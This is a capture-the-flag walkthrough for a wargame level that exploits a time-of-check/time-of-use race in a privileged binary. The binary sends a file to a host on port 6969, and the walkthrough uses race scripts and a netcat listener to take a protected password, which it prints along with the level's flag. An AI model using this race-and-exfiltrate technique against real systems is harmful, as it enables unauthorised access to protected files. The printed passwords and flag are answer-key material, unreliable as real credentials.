# level10

## Vulnerability: Coding mistake leading to file impersonating

level10's password: `s5cAJpM8ev6XHw998pRWG728z`

1. examinate existing files and permissions

```shell
ls -la
```

shows that the level10 executable belongs to flag10 group, token is flag10:flag10

2. get the executable (from an external device), decompile it using [retdec](https://github.com/avast/retdec) and examine the resulting code

```shell
scp -P 4242 level10@<host>:level10 .
retdecomp level10
```

it seems like the executable reads specified file then sends it to specified host on port 6969, using an access / open flow, which is a vulnerability because we can modify the file between the access and the open

3. testing the above supposition with a sample file and netcat

```shell
echo test > /tmp/test
./level10 /tmp/test 127.0.0.1 | nc -l 6969
```

Shows that we can receive the content of specified file with netcat

4. copy both shell programs in /tmp and chmod +x them, launch both to exploit access / open vulnerability and then receive the password with netcat

```shell
vim /tmp/exploit.sh
chmod +x /tmp/exploit.sh
vim /tmp/launch.sh
chmod +x /tmp/launch.sh
/tmp/launch.sh &
(open another terminal)
/tmp/exploit.sh &
nc -klv 6969 2>/dev/null | grep -v '.*( )*.'
```

gives flag10's password: `woupa2yuojeeaaed06riuj63c`

5. pwn the flag

```shell
su flag10
woupa2yuojeeaaed06riuj63c
getflag
```

gives flag: `feulo4b72j7edeahuete3no7c`
